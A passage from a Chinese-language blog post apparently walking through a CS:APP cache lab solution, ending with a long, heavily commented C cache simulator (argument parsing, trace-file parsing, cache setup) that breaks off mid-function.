通常说的cacheline大小，都是说的cacheline内部的block的大小。如32字节，64字节等，都是说的cacheline内部的block的大小为32，64字节</strong></p></blockquote><p>好了，分析到这里，基本上把整个流程走了一遍。剩下一些与主题无关代码，包括参数解析，trace file解析，可自行看以下代码（代码比较长，因为我加了详细注释，同时为了规范，加了一些“无用”代码，但看着应该没有压力）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @author: raven</span></span><br><span class="line"><span class="comment"> * @date 2020-7-26</span></span><br><span class="line"><span class="comment"> * @description: 模拟仿真计算机cache的 load modify load过程</span></span><br><span class="line"><span class="comment"> * @issue:</span></span><br><span class="line"><span class="comment"> * 1.没有考虑任何复杂度问题</span></span><br><span class="line"><span class="comment"> * 2.函数没有做安全性检查,比如判定null等</span></span><br><span class="line"><span class="comment"> * 3.main函数中使用到的内存引用没有free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">// getline函数不属于c标准, 需要开启GNU扩展</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------前置定义-----------------------*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_NAME_LEN 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OS_PTR_LEN 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">address64_t</span>;     <span class="comment">// 64-bit address</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_HIT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;hit\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_MISS(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;miss\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_EVICT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;evict\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------数据结构定义-----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;                     <span class="comment">// verbose</span></span><br><span class="line">    <span class="keyword">int</span> s;                     <span class="comment">// set bits 数</span></span><br><span class="line">    <span class="keyword">int</span> E;                     <span class="comment">// E-way</span></span><br><span class="line">    <span class="keyword">int</span> b;                     <span class="comment">// block offset bits</span></span><br><span class="line">    <span class="keyword">char</span> t[FILE_NAME_LEN];     <span class="comment">// trace file path</span></span><br><span class="line">&#125; param;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache line 结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid;                  <span class="comment">// 有效位</span></span><br><span class="line">    <span class="keyword">int</span> tag;                    <span class="comment">// tag</span></span><br><span class="line"><span class="comment">//    int block_data;             // 存储load到cache的数据，但是由于是模拟，实际这个filed是没用的</span></span><br><span class="line">    <span class="keyword">int</span> age;                    <span class="comment">// age，用于实现LRU替换策略</span></span><br><span class="line">&#125; cache_line;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  trace item结构： 存储trace file中的一行数据（不包括I开头的行)</span></span><br><span class="line"><span class="comment"> *  op_mode: 操作模式： L(load), M(modify), S(store)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> op_mode &#123;</span><br><span class="line">    L = <span class="number">0</span>,                           <span class="comment">// load</span></span><br><span class="line">    M = <span class="number">1</span>,                           <span class="comment">// modify</span></span><br><span class="line">    S = <span class="number">2</span>                            <span class="comment">// store</span></span><br><span class="line">&#125; op_mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">trace_item</span> &#123;</span></span><br><span class="line">    op_mode mode;                 <span class="comment">// 操作模式</span></span><br><span class="line">    <span class="keyword">address64_t</span> addr;                 <span class="comment">// 地址</span></span><br><span class="line"><span class="comment">//    unsigned int access_size;       // 访问的内存单元数(byte为单位), unsigned int 可以 typedef，但是没想到好名字</span></span><br><span class="line">&#125; trace_item;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * set: cache中的set， 一个set可以由多个line组成</span></span><br><span class="line"><span class="comment"> * cache: 模拟的cache table，cache由多个set组成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">set</span> &#123;</span></span><br><span class="line">    cache_line *lines;</span><br><span class="line">&#125; <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache</span> &#123;</span></span><br><span class="line">    <span class="built_in">set</span> *sets;</span><br><span class="line">&#125; cache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------全局变量定义----------------------*/</span></span><br><span class="line"><span class="keyword">char</span> *usage = <span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">              <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n&quot;</span>;             <span class="comment">// example 略...</span></span><br><span class="line"><span class="comment">// 结果集合</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hits, miss, evicts;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------操作function定义----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析输入参数</span></span><br><span class="line"><span class="comment"> * @param argc</span></span><br><span class="line"><span class="comment"> * @param argv</span></span><br><span class="line"><span class="comment"> * @param p  解析结果放置在p引用的内存中</span></span><br><span class="line"><span class="comment"> * @return 0 success parse</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_input_params</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                p-&gt;v = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                p-&gt;s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                p-&gt;E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                p-&gt;b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">sprintf</span>(p-&gt;t, <span class="string">&quot;%s&quot;</span>, optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, usage);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据字符c_mode,返回对应的op_mode枚举类型</span></span><br><span class="line"><span class="comment"> * @param c_mode</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">op_mode <span class="title">parse_op_mode</span><span class="params">(<span class="keyword">char</span> c_mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (c_mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> M;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> S;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            perror(<span class="string">&quot;can&#x27;t get op mode: invalid char!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析trace file</span></span><br><span class="line"><span class="comment"> * @param trace_item_ptr 解析结构放置的地方</span></span><br><span class="line"><span class="comment"> * @param trace_item_num trace数组长度</span></span><br><span class="line"><span class="comment"> * @param path 解析文件路径</span></span><br><span class="line"><span class="comment"> * @return  有效的trace item数量</span></span><br><span class="line"><span class="comment"> *          -1 解析失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">parse_trace_file</span><span class="params">(trace_item **trace_item_ptr, <span class="keyword">size_t</span> *trace_item_num, <span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">    trace_item *trace_items = *trace_item_ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(file = fopen(path, <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;trace file not exit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// read entry line by line</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (getline(&amp;line, &amp;len, file) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)  <span class="comment">// I 指令不需要解析</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*trace_item_num &lt;= i) &#123;</span><br><span class="line">            <span class="comment">// line 过多,超过trace_item_num, 需要重新分配</span></span><br><span class="line">            <span class="keyword">int</span> new_num = *trace_item_num;</span><br><span class="line">            <span class="keyword">do</span> &#123;                    <span class="comment">// 保证new_num 一定要比i大</span></span><br><span class="line">                new_num *= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (new_num &lt;= i);</span><br><span class="line">            </span><br><span class="line">            trace_items = <span class="built_in">realloc</span>(trace_items, new_num * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="keyword">if</span> (!trace_items) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;realloc memory for trace item failed\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            *trace_item_ptr = trace_items;</span><br><span class="line">            <span class="comment">// initialize  new alloc memory</span></span><br><span class="line">            <span class="built_in">memset</span>(trace_items + (*trace_item_num), <span class="number">0</span>, (new_num - *trace_item_num) * <span class="keyword">sizeof</span>(trace_item));</span><br><span class="line">            <span class="comment">// update item_num (包含了无效的项)</span></span><br><span class="line">            *trace_item_num = (*trace_item_num) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// mode</span></span><br><span class="line">        trace_items[i].mode = parse_op_mode(line[<span class="number">1</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// address</span></span><br><span class="line">        <span class="keyword">char</span> addr[OS_PTR_LEN + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">3</span>;      <span class="comment">// 代表line中&quot;address&quot;在line中的索引位置</span></span><br><span class="line">        <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 跳过所有</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="built_in">isdigit</span>(line[j]) &amp;&amp; <span class="built_in">isspace</span>(line[j]))</span><br><span class="line">            ++j;</span><br><span class="line">        offset = j;</span><br><span class="line">        <span class="comment">// 设置address</span></span><br><span class="line">        <span class="keyword">while</span> (line[j] != <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            addr[j - offset] = line[j];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        addr[j - offset] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        trace_items[i].addr = strtol(addr, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// byte_nums note: 实际仿真中,这个字段是没用的</span></span><br><span class="line"><span class="comment">//        char buf[10];</span></span><br><span class="line"><span class="comment">//        j++;     // 更新至第一个byte num索引索引位置</span></span><br><span class="line"><span class="comment">//        offset = j;</span></span><br><span class="line"><span class="comment">//        while (line[j] != &#x27;\n&#x27;) &#123;</span></span><br><span class="line"><span class="comment">//            buf[j - offset] = line[j];</span></span><br><span class="line"><span class="comment">//            j++;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        buf[j] = &#x27;\0&#x27;;</span></span><br><span class="line"><span class="comment">//        trace_items[i].access_size = atoi(buf);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// update idx</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 删除无用项</span></span><br><span class="line">    *trace_item_num = i;</span><br><span class="line">    *trace_item_ptr = (trace_item *) <span class="built_in">realloc</span>(*trace_item_ptr, <span class="keyword">sizeof</span>(trace_item) * (*trace_item_num));</span><br><span class="line">    </span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化系统cache</span></span><br><span class="line"><span class="comment"> * @param sys_cache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">(cache *sys_cache, param *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> S = <span class="number">1</span> &lt;&lt; p-&gt;s;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> E = p-&gt;E;</span><br><span class="line"><span class="comment">//    const int B = 1 &lt;&lt; p-&gt;b;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> *sets = (<span class="built_in">set</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">set</span>) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">       